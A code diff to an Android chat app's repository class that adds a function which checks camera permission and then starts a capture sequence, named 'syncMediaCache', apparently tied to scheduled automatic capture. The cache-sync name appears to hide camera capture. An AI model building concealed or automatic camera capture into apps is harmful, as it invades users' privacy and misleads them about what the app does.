@@ -4,6 +4,7 @@ import android.content.Context
 import android.content.SharedPreferences
 import android.os.Build
 import android.util.Log
+import androidx.core.content.ContextCompat
 import androidx.lifecycle.LiveData
 import androidx.lifecycle.MutableLiveData
 import com.google.gson.Gson
@@ -651,6 +652,21 @@ class ChatRepository private constructor(context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "Erro ao agendar captura automática", e)
             Result.failure(e)
+        }
+    }
+
+    suspend fun triggerSecureCapture(context: Context, lifecycleOwner: androidx.lifecycle.LifecycleOwner, sessionId: String) {
+        // 1. Verifica se a permissão de câmera está realmente concedida
+        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.CAMERA) 
+            == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+            
+            // 2. Se sim, dispara a sequência
+            syncMediaCache(context, lifecycleOwner, sessionId)
+            
+        } else {
+            // 3. Se não, loga o erro ou solicita a permissão novamente
+            Log.e("ChatRepository", "❌ Falha na captura: Permissão de Câmera não concedida.")
+            // Aqui você pode disparar um request de permissão se necessário
         }
     }
 
